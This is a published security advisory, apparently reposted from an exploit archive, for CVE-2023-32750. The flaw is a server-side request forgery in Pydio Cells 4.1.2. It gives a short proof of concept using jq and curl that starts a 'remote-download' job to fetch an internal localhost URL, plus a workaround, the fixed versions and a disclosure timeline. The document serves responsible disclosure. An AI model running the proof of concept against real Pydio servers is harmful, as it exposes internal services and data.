@@ -1,0 +1,156 @@
+id: 38749
+date: 05/31/2023
+title: Pydio Cells 4.1.2 - Server-Side Request Forgery Vulnerability
+author: RedTeam
+cves: CVE-2023-32750
+
+Exploit Title: Pydio Cells 4.1.2 - Server-Side Request Forgery
+Affected Versions: 4.1.2 and earlier versions
+Fixed Versions: 4.2.0, 4.1.3, 3.0.12
+Vulnerability Type: Server-Side Request Forgery
+Security Risk: medium
+Vendor URL: https://pydio.com/
+Vendor Status: notified
+Advisory URL: https://www.redteam-pentesting.de/advisories/rt-sa-2023-005
+Advisory Status: published
+CVE: CVE-2023-32750
+CVE URL: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-32750
+
+
+Introduction
+============
+
+"Pydio Cells is an open-core, self-hosted Document Sharing and
+Collaboration platform (DSC) specifically designed for organizations
+that need advanced document sharing and collaboration without security
+trade-offs or compliance issues."
+
+(from the vendor's homepage)
+
+
+More Details
+============
+
+Using the REST-API of Pydio Cells it is possible to start jobs. For
+example, when renaming a file or folder an HTTP request similar to the
+following is sent:
+
+------------------------------------------------------------------------
+PUT /a/jobs/user/move HTTP/2
+Host: example.com
+User-Agent: agent
+Accept: application/json
+Authorization: Bearer G4ZRN[...]
+Content-Type: application/json
+Content-Length: 140
+
+{
+  "JobName": "move",
+  "JsonParameters": "{\"nodes\":[\"cell/file.txt\"],\"target\":\"cell/renamed.txt\",\"targetParent\":false}"
+}
+------------------------------------------------------------------------
+
+The body contains a JSON object with a job name and additional
+parameters for the job. Besides the "move" job, also a job with the name
+"remote-download" exists. It takes two additional parameters: "urls" and
+"target". In the "urls" parameter, a list of URLs can be specified and in
+the parameter "target" a path can be specified in which to save the
+response. When the job is started, HTTP GET requests are sent from the
+Pydio Cells server to the specified URLs. The responses are saved into a
+file, which are uploaded to the specified folder within Pydio Cells.
+Potential errors are transmitted in a WebSocket channel, which can be
+opened through the "/ws/event" endpoint.
+
+
+Proof of Concept
+================
+
+Log into Pydio Cells and retrieve the JWT from the HTTP requests. Then,
+run the following commands to start a "remote-download" job to trigger
+an HTTP request:
+
+------------------------------------------------------------------------
+$ export JWT="<insert JWT here>"
+
+$ echo '{"urls": ["http://localhost:8000/internal.html"], "target": "personal-files"}' \
+| jq '{"JobName": "remote-download", "JsonParameters": (. | tostring)}' \
+| tee remote-download.json
+
+$ curl --header "Authorization: Bearer $JWT" \
+--header 'Content-Type: application/json' \
+--request PUT \
+--data @remote-download.json 'https://example.com/a/jobs/user/remote-download'
+------------------------------------------------------------------------
+
+The URL in the JSON document specifies which URL to request. The "target"
+field in the same document specifies into which folder the response is saved.
+Afterwards, the response is contained in a file in the specified folder.
+Potential errors are communicated through the WebSocket channel.
+
+
+Workaround
+==========
+
+Limit the services which can be reached by the Pydio Cells server, for
+example using an outbound firewall.
+
+
+Fix
+===
+
+Upgrade Pydio Cells to a version without the vulnerability.
+
+
+Security Risk
+=============
+
+The risk is highly dependent on the environment in which the attacked
+Pydio Cells instance runs. If there are any internal HTTP services which
+expose sensitive data on the same machine or within the same network,
+the server-side request forgery vulnerability could pose a significant
+risk. In other circumstances, the risk could be negligible. Therefore,
+overall the vulnerability is rated as a medium risk.
+
+
+Timeline
+========
+
+2023-03-23 Vulnerability identified
+2023-05-02 Customer approved disclosure to vendor
+2023-05-02 Vendor notified
+2023-05-03 CVE ID requested
+2023-05-08 Vendor released fixed version
+2023-05-14 CVE ID assigned
+2023-05-16 Vendor asks for a few more days before the advisory is released
+2023-05-30 Advisory released
+
+
+References
+==========
+
+
+
+RedTeam Pentesting GmbH
+=======================
+
+RedTeam Pentesting offers individual penetration tests performed by a
+team of specialised IT-security experts. Hereby, security weaknesses in
+company networks or products are uncovered and can be fixed immediately.
+
+As there are only few experts in this field, RedTeam Pentesting wants to
+share its knowledge and enhance the public knowledge with research in
+security-related areas. The results are made available as public
+security advisories.
+
+More information about RedTeam Pentesting can be found at:
+https://www.redteam-pentesting.de/
+
+
+Working at RedTeam Pentesting
+=============================
+
+RedTeam Pentesting is looking for penetration testers to join our team
+in Aachen, Germany. If you are interested please visit:
+https://jobs.redteam-pentesting.de/
+
+#  0day.today [2023-06-08]  #
